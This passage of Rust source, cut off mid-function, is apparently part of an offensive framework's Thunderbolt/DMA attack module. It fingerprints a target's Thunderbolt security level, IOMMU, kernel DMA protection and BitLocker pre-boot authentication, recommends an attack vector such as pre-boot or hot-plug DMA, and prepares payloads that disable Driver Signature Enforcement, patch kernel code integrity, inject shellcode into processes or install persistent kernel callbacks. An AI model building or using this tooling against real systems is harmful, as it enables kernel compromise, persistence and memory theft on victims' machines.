//! Thunderbolt / DMA attack framework.
//!
//! # Overview
//!
//! Provides three capabilities built around Thunderbolt and Direct Memory
//! Access (DMA):
//!
//! 1. **Controller detection** — discover Thunderbolt hardware, generation,
//!    security level, and IOMMU/VT-d status.
//! 2. **Vulnerability assessment** — determine whether the system is
//!    exploitable via DMA (depends on security level, kernel DMA protection,
//!    and pre-boot authentication).
//! 3. **Payload preparation** — generate a binary payload suitable for
//!    injection via a PCILeech-compatible Thunderbolt device.
//! 4. **Physical memory read** — read physical memory through DMA (either
//!    via BYOVD driver or direct Thunderbolt DMA engine).
//!
//! # Physical Access Requirements
//!
//! All techniques in this module require **physical access** to the target
//! machine, specifically:
//!
//! - A Thunderbolt 3/4 or USB4 port must be accessible
//! - The operator must have a DMA-capable device (e.g., PCILeech FPGA,
//!   Screamer, or a modified Thunderbolt device)
//! - For hot-plug attacks: Thunderbolt security must be "none" or "user"
//! - For cold-boot DMA: the device must be connected before power-on
//!
//! # Cross-Platform Notes
//!
//! | Operation               | Linux                                  | Windows                                  |
//! |-------------------------|----------------------------------------|------------------------------------------|
//! | Controller detection    | `/sys/bus/thunderbolt/devices/`        | SetupAPI `GUID_DEVINTERFACE_THUNDERBOLT` |
//! | IOMMU check             | `/sys/kernel/iommu_groups/`            | Registry `IOVMM` key                    |
//! | DMA protection          | Kernel config + sysfs                  | Registry `DmaRemappingCompatible`       |
//! | Physical memory read    | `/dev/mem` (with `CONFIG_STRICT_DEVMEM`)| BYOVD driver (MmMapIoSpace)             |
//!
//! # Feature Flag
//!
//! Gated by `hardware-persistence`.  Cross-platform (Linux and Windows).

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;

// ═══════════════════════════════════════════════════════════════════════════
// §1  Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Detected Thunderbolt controller information.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThunderboltInfo {
    /// Controller generation: TBT1, TBT2, TBT3, TBT4, or USB4.
    pub generation: ThunderboltGeneration,
    /// Security level reported by the controller.
    pub security_level: ThunderboltSecurityLevel,
    /// Number of Thunderbolt ports on the controller.
    pub port_count: u32,
    /// Whether IOMMU / VT-d is enabled (restricts DMA).
    pub iommu_enabled: bool,
    /// Whether kernel DMA protection is enabled (Windows 10 1803+).
    pub kernel_dma_protection: bool,
    /// Controller device name / model string.
    pub device_name: String,
    /// Controller vendor name (e.g., "Intel", "ASMedia").
    pub vendor: String,
    /// Firmware version string, if available.
    pub firmware_version: Option<String>,
    /// NHI (Native Host Interface) device path.
    pub nhi_path: Option<String>,
}

/// Thunderbolt hardware generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ThunderboltGeneration {
    /// Thunderbolt 1 (10 Gbps, mini DisplayPort connector).
    Thunderbolt1,
    /// Thunderbolt 2 (20 Gbps, mini DisplayPort connector).
    Thunderbolt2,
    /// Thunderbolt 3 (40 Gbps, USB-C connector).
    Thunderbolt3,
    /// Thunderbolt 4 (40 Gbps, USB-C connector, stricter requirements).
    Thunderbolt4,
    /// USB4 (40 Gbps, USB-C connector, optional TBT compatibility).
    Usb4,
    /// Generation could not be determined.
    Unknown,
}

impl std::fmt::Display for ThunderboltGeneration {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ThunderboltGeneration::Thunderbolt1 => write!(f, "Thunderbolt 1"),
            ThunderboltGeneration::Thunderbolt2 => write!(f, "Thunderbolt 2"),
            ThunderboltGeneration::Thunderbolt3 => write!(f, "Thunderbolt 3"),
            ThunderboltGeneration::Thunderbolt4 => write!(f, "Thunderbolt 4"),
            ThunderboltGeneration::Usb4 => write!(f, "USB4"),
            ThunderboltGeneration::Unknown => write!(f, "Unknown"),
        }
    }
}

/// Thunderbolt security level (as reported by the controller firmware).
///
/// Security levels determine whether an untrusted Thunderbolt device can
/// perform DMA without user approval.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ThunderboltSecurityLevel {
    /// No security — any Thunderbolt device can perform DMA immediately.
    /// **Vulnerable to DMA attacks.**
    None,
    /// User must approve the device (dialog appears), but once approved
    /// the device has full DMA access.  Vulnerable to social engineering
    /// and to devices spoofing an approved device.
    User,
    /// Secure — device authentication via challenge-response.
    /// **Not vulnerable to simple DMA attacks.**
    Secure,
    /// Device is pre-authorized via a stored key in the EFI firmware.
    /// Not directly vulnerable, but a cloned device could bypass it.
    Device,
    /// Security level could not be determined.
    Unknown,
}

impl std::fmt::Display for ThunderboltSecurityLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ThunderboltSecurityLevel::None => write!(f, "none"),
            ThunderboltSecurityLevel::User => write!(f, "user"),
            ThunderboltSecurityLevel::Secure => write!(f, "secure"),
            ThunderboltSecurityLevel::Device => write!(f, "device"),
            ThunderboltSecurityLevel::Unknown => write!(f, "unknown"),
        }
    }
}

/// DMA vulnerability assessment result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DmaVulnerability {
    /// Whether the system is vulnerable to DMA attacks.
    pub vulnerable: bool,
    /// Human-readable summary of the assessment.
    pub summary: String,
    /// Risk level (1 = low, 5 = critical).
    pub risk_level: u8,
    /// Contributing factors to the vulnerability assessment.
    pub factors: Vec<DmaFactor>,
    /// Recommended attack vector (if vulnerable).
    pub recommended_vector: Option<DmaAttackVector>,
}

/// A factor contributing to the DMA vulnerability assessment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DmaFactor {
    /// Factor name.
    pub name: String,
    /// Whether this factor contributes to vulnerability.
    pub contributes_to_vulnerability: bool,
    /// Human-readable description.
    pub description: String,
}

/// DMA attack vector recommendation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DmaAttackVector {
    /// Hot-plug DMA attack (connect device while OS is running).
    HotPlug,
    /// Cold-boot DMA attack (connect device before power-on).
    ColdBoot,
    /// BYOVD-based DMA (use vulnerable driver for memory access).
    Byovd,
    /// Pre-boot DMA (exploit before OS kernel locks down DMA).
    PreBoot,
}

/// DMA payload for injection via Thunderbolt device.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DmaPayload {
    /// The payload binary data.
    pub data: Vec<u8>,
    /// Target architecture (x86_64 or aarch64).
    pub architecture: DmaPayloadArch,
    /// Payload type (kernel patch, process injection, etc.).
    pub payload_type: DmaPayloadType,
    /// Physical address where the payload should be injected.
    pub target_address: Option<u64>,
    /// Description of the payload's purpose.
    pub description: String,
}

/// DMA payload target architecture.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DmaPayloadArch {
    X86_64,
    Aarch64,
}

/// DMA payload type.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DmaPayloadType {
    /// Patch the kernel to disable Driver Signature Enforcement.
    KernelDseDisable,
    /// Inject shellcode into a target process.
    ProcessInjection,
    /// Patch the kernel's code integrity checks.
    CodeIntegrityPatch,
    /// Install a kernel-level callback (e.g., for persistence).
    KernelCallbackInstall,
    /// Raw binary payload (operator-defined).
    Raw,
}

// ═══════════════════════════════════════════════════════════════════════════
// §2  Thunderbolt Controller Detection
// ═══════════════════════════════════════════════════════════════════════════

/// Detect Thunderbolt controller(s) on the system.
///
/// **Linux**: reads `/sys/bus/thunderbolt/devices/` for controller info.
/// **Windows**: queries SetupAPI for `GUID_DEVINTERFACE_THUNDERBOLT`.
///
/// Returns `Ok(None)` if no Thunderbolt controller is found.
/// Returns `Ok(Some(info))` with the primary controller's details.
///
/// # Physical Access
///
/// This function does NOT require physical access — it only reads system
/// information about existing Thunderbolt hardware.
pub fn detect_thunderbolt_controller() -> Result<Option<ThunderboltInfo>> {
    #[cfg(target_os = "linux")]
    {
        detect_thunderbolt_controller_linux()
    }
    #[cfg(windows)]
    {
        detect_thunderbolt_controller_windows()
    }
    #[cfg(not(any(target_os = "linux", windows)))]
    {
        Ok(None)
    }
}

/// Linux: detect Thunderbolt controller via sysfs.
#[cfg(target_os = "linux")]
fn detect_thunderbolt_controller_linux() -> Result<Option<ThunderboltInfo>> {
    let tb_path = Path::new("/sys/bus/thunderbolt/devices");
    if !tb_path.exists() {
        return Ok(None);
    }

    let mut controllers = Vec::new();
    let entries =
        std::fs::read_dir(tb_path).with_context(|| "cannot read /sys/bus/thunderbolt/devices")?;

    for entry in entries {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();

        // Controller entries are named like "0-0", "1-0" etc.
        // Domain entries are named like "domain0", "domain1" etc.
        // Host controller NHI entries contain "nhi" or start with a number.
        if !name.contains('-') && !name.starts_with("domain") {
            continue;
        }

        let controller_dir = entry.path();

        // Read generation from the device type or name.
        let generation = detect_generation_linux(&controller_dir, &name);

        // Read security level.
        let security_level = read_sysfs_security_level(&controller_dir);

        // Read vendor and device name.
        let vendor = read_sysfs_string(&controller_dir.join("vendor_name"))
            .unwrap_or_else(|| "Unknown".to_string());
        let device_name =
            read_sysfs_string(&controller_dir.join("device_name")).unwrap_or_else(|| name.clone());

        // Read firmware version.
        let firmware_version = read_sysfs_string(&controller_dir.join("nvm_version"))
            .or_else(|| read_sysfs_string(&controller_dir.join("nvm_non_auth_version")));

        // Count ports (look for port entries).
        let port_count = count_thunderbolt_ports(tb_path, &name);

        // Check IOMMU.
        let iommu_enabled = check_iommu_linux();

        // Check kernel DMA protection (Linux-specific).
        let kernel_dma_protection = check_kernel_dma_protection_linux();

        // Find NHI device path.
        let nhi_path = find_nhi_device_linux(tb_path, &name);

        controllers.push(ThunderboltInfo {
            generation,
            security_level,
            port_count,
            iommu_enabled,
            kernel_dma_protection,
            device_name,
            vendor,
            firmware_version,
            nhi_path,
        });
    }

    // Return the primary controller (first one found).
    if controllers.is_empty() {
        Ok(None)
    } else {
        Ok(Some(controllers.into_iter().next().unwrap()))
    }
}

/// Detect Thunderbolt generation from sysfs device properties.
#[cfg(target_os = "linux")]
fn detect_generation_linux(device_dir: &Path, name: &str) -> ThunderboltGeneration {
    // Try to read the generation from sysfs.
    if let Some(gen_str) = read_sysfs_string(&device_dir.join("generation")) {
        return match gen_str.trim() {
            "1" => ThunderboltGeneration::Thunderbolt1,
            "2" => ThunderboltGeneration::Thunderbolt2,
            "3" => ThunderboltGeneration::Thunderbolt3,
            "4" => ThunderboltGeneration::Thunderbolt4,
            "usb4" => ThunderboltGeneration::Usb4,
            _ => ThunderboltGeneration::Unknown,
        };
    }

    // Fall back to heuristics based on device name.
    // Domain name "domain0" or "domain1" doesn't tell us the generation,
    // but we can check for USB4-specific files.
    if device_dir.join("usb4").exists() || name.contains("usb4") {
        return ThunderboltGeneration::Usb4;
    }

    ThunderboltGeneration::Unknown
}

/// Read security level from sysfs.
#[cfg(target_os = "linux")]
fn read_sysfs_security_level(device_dir: &Path) -> ThunderboltSecurityLevel {
    // For domain directories, read security attribute.
    let security_path = device_dir.join("security");
    if let Some(level) = read_sysfs_string(&security_path) {
        return match level.trim() {
            "none" => ThunderboltSecurityLevel::None,
            "user" => ThunderboltSecurityLevel::User,
            "secure" => ThunderboltSecurityLevel::Secure,
            "device" => ThunderboltSecurityLevel::Device,
            "dponly" => ThunderboltSecurityLevel::Secure, // DisplayPort only — effectively secure
            _ => ThunderboltSecurityLevel::Unknown,
        };
    }
    ThunderboltSecurityLevel::Unknown
}

/// Check if IOMMU / VT-d is enabled on Linux.
#[cfg(target_os = "linux")]
fn check_iommu_linux() -> bool {
    // Method 1: Check for IOMMU groups (indicates IOMMU is active).
    let iommu_groups = Path::new("/sys/kernel/iommu_groups");
    if iommu_groups.exists() {
        if let Ok(entries) = std::fs::read_dir(iommu_groups) {
            if entries.count() > 0 {
                return true;
            }
        }
    }

    // Method 2: Check kernel command line for intel_iommu=on or amd_iommu=on.
    if let Ok(cmdline) = std::fs::read_to_string("/proc/cmdline") {
        if cmdline.contains("intel_iommu=on") || cmdline.contains("amd_iommu=on") {
            return true;
        }
    }

    // Method 3: Check for DMAR table in ACPI (VT-d indicator).
    Path::new("/sys/firmware/acpi/tables/DMAR").exists()
}

/// Check kernel DMA protection on Linux.
#[cfg(target_os = "linux")]
fn check_kernel_dma_protection_linux() -> bool {
    // Linux kernel DMA protection relies on IOMMU being enabled.
    // If IOMMU is active and the Thunderbolt subsystem enforces DMA
    // protection, then DMA is restricted.
    check_iommu_linux()
}

/// Count Thunderbolt ports for a given controller.
#[cfg(target_os = "linux")]
fn count_thunderbolt_ports(tb_path: &Path, controller_name: &str) -> u32 {
    let prefix = if controller_name.starts_with("domain") {
        // For domain entries, ports are named "0-0:1", "0-0:2" etc.
        controller_name.replace("domain", "")
    } else {
        // For controller entries like "0-0", extract the domain.
        controller_name.split('-').next().unwrap_or("0").to_string()
    };

    let mut count = 0u32;
    if let Ok(entries) = std::fs::read_dir(tb_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            // Port entries look like "0-1", "0-2" (domain-port).
            if name.starts_with(&prefix) && name.contains(':') {
                count += 1;
            }
        }
    }
    // Always at least 1 port if controller exists.
    count.max(1)
}

/// Find the NHI (Native Host Interface) device path.
#[cfg(target_os = "linux")]
fn find_nhi_device_linux(tb_path: &Path, controller_name: &str) -> Option<String> {
    // NHI devices are under the controller directory.
    let domain = controller_name.split('-').next().unwrap_or("0");
    if let Ok(entries) = std::fs::read_dir(tb_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            // NHI entries are named like "domain0-0" or contain "nhi".
            if name.starts_with(domain) && name.contains("nhi") {
                return Some(entry.path().to_string_lossy().to_string());
            }
        }
    }
    None
}

/// Windows: detect Thunderbolt controller via registry and SetupAPI patterns.
#[cfg(windows)]
fn detect_thunderbolt_controller_windows() -> Result<Option<ThunderboltInfo>> {
    use std::process::Command;

    // Use PowerShell to query for Thunderbolt controllers via WMI/CIM.
    let ps_script = r#"
        Get-CimInstance -Namespace root\Windows -ClassName Win32_PnPEntity |
        Where-Object { $_.Name -match 'Thunderbolt' -or $_.Name -match 'USB4' } |
        Select-Object -First 1 |
        ConvertTo-Json
    "#;

    let output = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", ps_script])
        .output()
        .context("failed to run PowerShell for Thunderbolt detection")?;

    if !output.status.success() {
        // Fallback: check registry for Thunderbolt driver presence.
        return detect_thunderbolt_via_registry();
    }

    let json_str = String::from_utf8_lossy(&output.stdout);
    if json_str.trim().is_empty() {
        return Ok(None);
    }

    // Parse the JSON output.
    let dev: serde_json::Value = match serde_json::from_str(&json_str) {
        Ok(v) => v,
        Err(_) => return Ok(None),
    };

    let device_name = dev["Name"]
        .as_str()
        .unwrap_or("Unknown Thunderbolt Controller")
        .to_string();

    let vendor = dev["Manufacturer"]
        .as_str()
        .unwrap_or("Unknown")
        .to_string();

    // Determine generation from device name heuristics.
    let generation = if device_name.contains("USB4") {
        ThunderboltGeneration::Usb4
    } else if device_name.contains("Thunderbolt™ 4") || device_name.contains("Thunderbolt 4") {
        ThunderboltGeneration::Thunderbolt4
    } else if device_name.contains("Thunderbolt™ 3") || device_name.contains("Thunderbolt 3") {
        ThunderboltGeneration::Thunderbolt3
    } else if device_name.contains("Thunderbolt™ 2") || device_name.contains("Thunderbolt 2") {
        ThunderboltGeneration::Thunderbolt2
    } else if device_name.contains("Thunderbolt") {
        ThunderboltGeneration::Unknown // Could be any generation
    } else {
        ThunderboltGeneration::Unknown
    };

    // Check IOMMU/VT-d via registry.
    let iommu_enabled = check_iommu_windows();

    // Check kernel DMA protection.
    let kernel_dma_protection = check_kernel_dma_protection_windows();

    // Security level — Windows doesn't expose this directly, infer from
    // kernel DMA protection status.
    let security_level = if kernel_dma_protection {
        ThunderboltSecurityLevel::Secure
    } else {
        ThunderboltSecurityLevel::Unknown
    };

    Ok(Some(ThunderboltInfo {
        generation,
        security_level,
        port_count: 1, // Default, hard to determine on Windows without WMI
        iommu_enabled,
        kernel_dma_protection,
        device_name,
        vendor,
        firmware_version: None,
        nhi_path: None,
    }))
}

/// Windows: fallback Thunderbolt detection via registry.
#[cfg(windows)]
fn detect_thunderbolt_via_registry() -> Result<Option<ThunderboltInfo>> {
    use std::process::Command;

    // Check for Thunderbolt driver in the system driver list.
    let output = Command::new("reg")
        .args([
            "query",
            r"HKLM\SYSTEM\CurrentControlSet\Services",
            "/s",
            "/f",
            "Thunderbolt",
        ])
        .output()
        .context("failed to query registry for Thunderbolt drivers")?;

    if !output.status.success() || output.stdout.is_empty() {
        return Ok(None);
    }

    // Found a Thunderbolt-related service — report basic info.
    Ok(Some(ThunderboltInfo {
        generation: ThunderboltGeneration::Unknown,
        security_level: ThunderboltSecurityLevel::Unknown,
        port_count: 1,
        iommu_enabled: check_iommu_windows(),
        kernel_dma_protection: check_kernel_dma_protection_windows(),
        device_name: "Thunderbolt Controller (Registry)".to_string(),
        vendor: "Unknown".to_string(),
        firmware_version: None,
        nhi_path: None,
    }))
}

/// Windows: check if IOMMU / VT-d is enabled via registry.
#[cfg(windows)]
fn check_iommu_windows() -> bool {
    use std::process::Command;

    // Check for VT-d / IOMMU in the firmware.
    // The IOVMM key indicates I/O Virtualization (VT-d) is enabled.
    let output = Command::new("reg")
        .args([
            "query",
            r"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity",
        ])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        // If Hyper-V Code Integrity is enabled, VT-d is likely active.
        if text.contains("Enabled") {
            return true;
        }
    }

    // Alternative: check for IOMMU via WMI.
    let ps_output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "(Get-CimInstance -ClassName Win32_ComputerSystem).HypervisorPresent",
        ])
        .output();

    if let Ok(out) = ps_output {
        let text = String::from_utf8_lossy(&out.stdout);
        return text.trim().eq_ignore_ascii_case("true");
    }

    false
}

/// Windows: check kernel DMA protection via registry.
#[cfg(windows)]
fn check_kernel_dma_protection_windows() -> bool {
    use std::process::Command;

    // Windows 10 1803+ stores kernel DMA protection in the registry.
    // HKLM\SYSTEM\CurrentControlSet\Control\DmaSecurity\AllowDirectAccess
    // If absent or 0, DMA protection is enforced.
    let output = Command::new("reg")
        .args([
            "query",
            r"HKLM\SYSTEM\CurrentControlSet\Control\DmaSecurity",
        ])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        // If DmaSecurity key exists, kernel DMA protection is active.
        if text.contains("DmaSecurity") {
            return true;
        }
    }

    // Alternative: check for Device Guard / Credential Guard which implies
    // DMA protection.
    let output = Command::new("reg")
        .args([
            "query",
            r"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard",
            "/v",
            "EnableVirtualizationBasedSecurity",
        ])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        if text.contains("0x1") {
            return true;
        }
    }

    false
}

/// Read a sysfs file as a trimmed string.
fn read_sysfs_string(path: &Path) -> Option<String> {
    std::fs::read_to_string(path)
        .ok()
        .map(|s| s.trim().to_string())
}

// ═══════════════════════════════════════════════════════════════════════════
// §3  DMA Vulnerability Assessment
// ═══════════════════════════════════════════════════════════════════════════

/// Assess the system's vulnerability to DMA attacks.
///
/// Checks multiple factors:
/// - Thunderbolt security level (none/user = vulnerable)
/// - IOMMU / VT-d status (disabled = vulnerable)
/// - Kernel DMA protection (disabled = vulnerable)
/// - Pre-boot authentication (BitLocker PIN/TPM)
///
/// Returns a comprehensive vulnerability assessment with risk level.
pub fn check_dma_vulnerability() -> Result<DmaVulnerability> {
    let mut factors = Vec::new();
    let mut vulnerable = false;
    let mut risk_level: u8 = 1;

    // Factor 1: Thunderbolt controller presence.
    let controller = detect_thunderbolt_controller()?;
    match controller {
        Some(ref info) => {
            factors.push(DmaFactor {
                name: "Thunderbolt Controller".to_string(),
                contributes_to_vulnerability: true,
                description: format!(
                    "{} controller detected ({})",
                    info.generation, info.device_name
                ),
            });
            risk_level = risk_level.saturating_add(1);

            // Factor 2: Security level.
            match info.security_level {
                ThunderboltSecurityLevel::None => {
                    factors.push(DmaFactor {
                        name: "Thunderbolt Security".to_string(),
                        contributes_to_vulnerability: true,
                        description: "Security level is 'none' — any Thunderbolt device \
                            can perform DMA without authentication"
                            .to_string(),
                    });
                    vulnerable = true;
                    risk_level = risk_level.saturating_add(2);
                }
                ThunderboltSecurityLevel::User => {
                    factors.push(DmaFactor {
                        name: "Thunderbolt Security".to_string(),
                        contributes_to_vulnerability: true,
                        description: "Security level is 'user' — devices can gain DMA \
                            access with user approval (social engineering risk)"
                            .to_string(),
                    });
                    vulnerable = true;
                    risk_level = risk_level.saturating_add(1);
                }
                ThunderboltSecurityLevel::Secure | ThunderboltSecurityLevel::Device => {
                    factors.push(DmaFactor {
                        name: "Thunderbolt Security".to_string(),
                        contributes_to_vulnerability: false,
                        description: format!(
                            "Security level is '{}' — DMA requires device authentication",
                            info.security_level
                        ),
                    });
                }
                ThunderboltSecurityLevel::Unknown => {
                    factors.push(DmaFactor {
                        name: "Thunderbolt Security".to_string(),
                        contributes_to_vulnerability: false,
                        description: "Security level could not be determined".to_string(),
                    });
                }
            }

            // Factor 3: IOMMU / VT-d.
            if info.iommu_enabled {
                factors.push(DmaFactor {
                    name: "IOMMU/VT-d".to_string(),
                    contributes_to_vulnerability: false,
                    description: "IOMMU/VT-d is enabled — DMA is restricted to \
                        authorized devices only"
                        .to_string(),
                });
            } else {
                factors.push(DmaFactor {
                    name: "IOMMU/VT-d".to_string(),
                    contributes_to_vulnerability: true,
                    description: "IOMMU/VT-d is NOT enabled — DMA is unrestricted; \
                        any Thunderbolt device can access all physical memory"
                        .to_string(),
                });
                vulnerable = true;
                risk_level = risk_level.saturating_add(2);
            }

            // Factor 4: Kernel DMA protection.
            if info.kernel_dma_protection {
                factors.push(DmaFactor {
                    name: "Kernel DMA Protection".to_string(),
                    contributes_to_vulnerability: false,
                    description: "Kernel DMA protection is enabled (OS-level DMA restriction)"
                        .to_string(),
                });
            } else {
                factors.push(DmaFactor {
                    name: "Kernel DMA Protection".to_string(),
                    contributes_to_vulnerability: true,
                    description: "Kernel DMA protection is NOT enabled — no OS-level \
                        DMA restrictions"
                        .to_string(),
                });
                // Without kernel DMA protection, pre-boot DMA is possible.
                vulnerable = true;
                risk_level = risk_level.saturating_add(1);
            }
        }
        None => {
            factors.push(DmaFactor {
                name: "Thunderbolt Controller".to_string(),
                contributes_to_vulnerability: false,
                description: "No Thunderbolt controller detected — DMA via Thunderbolt \
                    is not possible"
                    .to_string(),
            });
        }
    }

    // Factor 5: Pre-boot authentication (check for BitLocker PIN).
    let preboot_auth = check_preboot_authentication();
    factors.push(DmaFactor {
        name: "Pre-boot Authentication".to_string(),
        contributes_to_vulnerability: !preboot_auth,
        description: if preboot_auth {
            "Pre-boot authentication is configured — DMA attacks are blocked \
                before OS loads"
                .to_string()
        } else {
            "No pre-boot authentication — DMA attacks are possible before \
                OS loads (e.g., at login screen)"
                .to_string()
        },
    });

    if !preboot_auth {
        vulnerable = true;
        risk_level = risk_level.saturating_add(1);
    }

    // Cap risk level at 5.
    risk_level = risk_level.min(5);

    // Determine recommended attack vector.
    let recommended_vector = if vulnerable {
        if !preboot_auth {
            Some(DmaAttackVector::PreBoot)
        } else if matches!(controller, Some(ref c) if c.security_level == ThunderboltSecurityLevel::None)
        {
            Some(DmaAttackVector::HotPlug)
        } else {
            Some(DmaAttackVector::ColdBoot)
        }
    } else {
        // If not directly vulnerable, BYOVD may still work if we can load a driver.
        Some(DmaAttackVector::Byovd)
    };

    let summary = if vulnerable {
        format!(
            "System IS vulnerable to DMA attacks (risk level {}/5). \
             {} contributing factors detected.",
            risk_level,
            factors
                .iter()
                .filter(|f| f.contributes_to_vulnerability)
                .count()
        )
    } else {
        "System is NOT directly vulnerable to DMA attacks. All DMA protection \
         mechanisms are active."
            .to_string()
    };

    Ok(DmaVulnerability {
        vulnerable,
        summary,
        risk_level,
        factors,
        recommended_vector,
    })
}

/// Check if pre-boot authentication is configured.
///
/// On Linux: check for LUKS or similar disk encryption with a passphrase.
/// On Windows: check BitLocker protector type (TPM+PIN vs TPM-only).
fn check_preboot_authentication() -> bool {
    #[cfg(target_os = "linux")]
    {
        check_preboot_auth_linux()
    }
    #[cfg(windows)]
    {
        check_preboot_auth_windows()
    }
    #[cfg(not(any(target_os = "linux", windows)))]
    {
        false
    }
}

/// Linux: check for pre-boot authentication via LUKS.
#[cfg(target_os = "linux")]
fn check_preboot_auth_linux() -> bool {
    // Check if any LUKS-encrypted volumes exist with a passphrase slot.
    // LUKS headers are at the start of encrypted partitions.
    let crypttab = Path::new("/etc/crypttab");
    if crypttab.exists() {
        if let Ok(content) = std::fs::read_to_string(crypttab) {
            for line in content.lines() {
                let line = line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                // crypttab format: name device keyfile options
                // If options contain "luks" and no keyfile is specified
                // (or keyfile is "none"), a passphrase is required.
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 {
                    let keyfile = parts[2];
                    if keyfile == "none" || keyfile == "-" {
                        return true; // Passphrase required at boot
                    }
                }
            }
        }
    }

    // Check for encrypted swap (indicates security-conscious setup).
    let crypttab_swap = std::process::Command::new("dmsetup")
        .args(["ls", "--target", "crypt"])
        .output();

    if let Ok(output) = crypttab_swap {
        if output.status.success() {
            let text = String::from_utf8_lossy(&output.stdout);
            if !text.trim().is_empty() {
                // Encrypted devices exist, but we can't determine if they
                // require a passphrase from dmsetup alone.
            }
        }
    }

    false
}

/// Windows: check BitLocker protector type for pre-boot authentication.
#[cfg(windows)]
fn check_preboot_auth_windows() -> bool {
    use std::process::Command;

    // Query BitLocker status for the OS drive.
    let output = Command::new("manage-bde")
        .args(["-status", "-protection", "C:"])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        // If protection is ON and uses TPM+PIN, pre-boot auth is active.
        if text.contains("tpm and pin") || text.contains("tpm and startup key") {
            return true;
        }
        // TPM-only means no pre-boot PIN — DMA attack possible before login.
        if text.contains("tpm") {
            return false;
        }
    }

    // Alternative: check via PowerShell.
    let ps_output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "(Get-BitLockerVolume -MountPoint C:).KeyProtector |
             Where-Object { $_.KeyProtectorType -eq 'TpmPin' } |
             Measure-Object | Select-Object -ExpandProperty Count",
        ])
        .output();

    if let Ok(out) = ps_output {
        let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if let Ok(count) = text.parse::<u32>() {
            return count > 0;
        }
    }

    false
}

// ═══════════════════════════════════════════════════════════════════════════
// §4  DMA Payload Generation
// ═══════════════════════════════════════════════════════════════════════════

/// Generate a DMA payload for injection via a Thunderbolt device.
///
/// The payload is a small binary blob designed to run in the target's
/// physical memory via DMA.  It is loaded onto a PCILeech-compatible
/// Thunderbolt device for delivery.
///
/// # Payload Types
///
/// - `KernelDseDisable`: Patches the Windows kernel to disable Driver
///   Signature Enforcement, allowing unsigned drivers to load.
/// - `ProcessInjection`: Injects shellcode into a running process.
/// - `CodeIntegrityPatch`: Patches the kernel's code integrity checks.
/// - `Raw`: Operator-supplied binary payload.
///
/// # Physical Access
///
/// **Requires physical access to the target machine.** The operator must
/// have a DMA-capable Thunderbolt device (e.g., PCILeech FPGA, Screamer)
/// connected to the target.
///
/// # Note
///
/// The actual hardware delivery mechanism is outside Orchestra's scope —
/// this function prepares the payload binary.  Loading it onto the device
/// and executing the DMA transaction is handled by external tools (PCILeech,
/// Inception, etc.).
pub fn prepare_dma_payload(payload_type: DmaPayloadType) -> Result<DmaPayload> {
    prepare_dma_payload_with_data(payload_type, None)
}

/// Generate a DMA payload with optional operator-supplied data.
///
/// This is the full-variant entry point.  [`prepare_dma_payload`] delegates
/// here with `data = None`.
///
/// # Payload Types and Data Requirements
///
/// | Payload Type            | `data` Required | Description |
/// |-------------------------|-----------------|-------------|
/// | `KernelDseDisable`      | No              | Self-contained signature scanner |
/// | `CodeIntegrityPatch`    | No              | Self-contained signature scanner |
/// | `ProcessInjection`      | Yes             | Target-specific shellcode |
/// | `KernelCallbackInstall` | Yes             | Callback setup code |
/// | `Raw`                   | Yes             | Arbitrary binary blob |
pub fn prepare_dma_payload_with_data(
    payload_type: DmaPayloadType,
    data: Option<&[u8]>,
) -> Result<DmaPayload> {
    match payload_type {
        DmaPayloadType::KernelDseDisable => prepare_dse_disable_payload(),
        DmaPayloadType::ProcessInjection => {
            let shellcode = data.ok_or_else(|| {
                anyhow!(
                    "ProcessInjection payload requires target-specific shellcode. \
                     Pass the shellcode via prepare_dma_payload_with_data(.., Some(data))."
                )
            })?;
            Ok(DmaPayload {
                data: shellcode.to_vec(),
                architecture: DmaPayloadArch::X86_64,
                payload_type: DmaPayloadType::ProcessInjection,
                target_address: None,
                description: "Operator-supplied process-injection shellcode".to_string(),
            })
        }
        DmaPayloadType::CodeIntegrityPatch => prepare_code_integrity_payload(),
        DmaPayloadType::KernelCallbackInstall => {
            let callback_code = data.ok_or_else(|| {
                anyhow!(
                    "KernelCallbackInstall payload requires callback-specific code. \
                     Pass the code via prepare_dma_payload_with_data(.., Some(data))."
                )
            })?;
            Ok(DmaPayload {
                data: callback_code.to_vec(),
                architecture: DmaPayloadArch::X86_64,
                payload_type: DmaPayloadType::KernelCallbackInstall,
                target_address: None,
                description: "Operator-supplied kernel-callback install code".to_string(),
            })
        }
        DmaPayloadType::Raw => {
            let raw_data = data.ok_or_else(|| {
                anyhow!(
